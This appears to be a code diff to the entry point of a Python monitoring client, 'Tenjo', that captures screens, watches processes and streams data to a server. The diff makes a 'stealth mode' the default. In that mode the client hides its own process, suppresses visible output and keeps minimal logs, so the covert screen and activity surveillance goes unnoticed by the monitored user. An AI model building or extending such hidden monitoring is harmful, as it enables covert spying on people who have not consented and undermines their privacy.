@@ -9,6 +9,8 @@ import json
 import requests
 from datetime import datetime
 import logging
+import signal
+import platform
 
 # Import modules
 from src.core.config import Config
@@ -19,11 +21,25 @@ from src.modules.stream_handler import StreamHandler
 from src.utils.stealth import StealthManager
 from src.utils.api_client import APIClient
 
+# Global flag for graceful shutdown
+shutdown_flag = False
+
+def signal_handler(signum, frame):
+    """Handle shutdown signals gracefully"""
+    global shutdown_flag
+    logging.info(f"Received signal {signum}, initiating graceful shutdown...")
+    shutdown_flag = True
+
 class TenjoClient:
-    def __init__(self):
+    def __init__(self, stealth_mode=True):
         # Use API_ENDPOINT from config
         self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)
         self.stealth_manager = StealthManager()
+        self.stealth_mode = stealth_mode
+        
+        # Set up stealth logging if in stealth mode
+        if stealth_mode:
+            self._setup_stealth_logging()
 
         # Initialize modules
         self.screen_capture = ScreenCapture(self.api_client)
@@ -31,11 +47,34 @@ class TenjoClient:
         self.process_monitor = ProcessMonitor(self.api_client)
         self.stream_handler = StreamHandler(self.api_client)
 
-        # Setup logging (hidden)
+        # Setup logging
         self.setup_logging()
 
+    def _setup_stealth_logging(self):
+        """Setup logging for stealth mode - minimal output"""
+        log_dir = os.path.join(os.path.dirname(__file__), "logs")
+        os.makedirs(log_dir, exist_ok=True)
+        
+        log_file = os.path.join(log_dir, "stealth.log")
+        
+        # Remove any existing handlers
+        for handler in logging.root.handlers[:]:
+            logging.root.removeHandler(handler)
+            
+        # Setup file logging only
+        logging.basicConfig(
+            level=logging.WARNING,  # Only warnings and errors
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler(log_file)
+            ]
+        )
+
     def setup_logging(self):
-        """Setup stealth logging"""
+        """Setup normal logging"""
+        if self.stealth_mode:
+            return  # Already set up in _setup_stealth_logging
+            
         log_dir = Config.LOG_DIR
 
         logging.basicConfig(
@@ -136,21 +175,54 @@ class TenjoClient:
             logging.error(f"Error stopping client: {str(e)}")
 
 
-def main():
+def main(stealth_mode=True):
     """Main entry point"""
+    global shutdown_flag
+    
+    # Register signal handlers for graceful shutdown
+    signal.signal(signal.SIGTERM, signal_handler)
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    client = None
     try:
-        client = TenjoClient()
-
-        # Hide process
-        client.stealth_manager.hide_process()
+        # Check if running from stealth installation
+        is_stealth = stealth_mode or 'stealth_main.py' in sys.argv[0] or len(sys.argv) > 1 and sys.argv[1] == '--stealth'
+        
+        client = TenjoClient(stealth_mode=is_stealth)
+        
+        if is_stealth:
+            # Hide process in stealth mode
+            client.stealth_manager.hide_process()
+            logging.warning("Stealth monitoring service started")
+        else:
+            logging.info("Tenjo monitoring client started")
 
         # Start monitoring
         client.start_monitoring()
+        
+        # Keep running until shutdown signal
+        while not shutdown_flag:
+            try:
+                # Send heartbeat every 5 minutes
+                client.send_heartbeat()
+                time.sleep(300)  # 5 minutes
+            except KeyboardInterrupt:
+                break
+            except Exception as e:
+                logging.error(f"Runtime error: {str(e)}")
+                time.sleep(60)  # Wait before retrying
 
     except KeyboardInterrupt:
         logging.info("Client stopped by user")
     except Exception as e:
         logging.error(f"Unexpected error: {str(e)}")
+        if not stealth_mode:
+            print(f"Error: {str(e)}")
+    finally:
+        if client:
+            client.stop()
 
 if __name__ == "__main__":
-    main()
+    # Check for stealth flag
+    stealth = '--stealth' in sys.argv
+    main(stealth_mode=stealth)
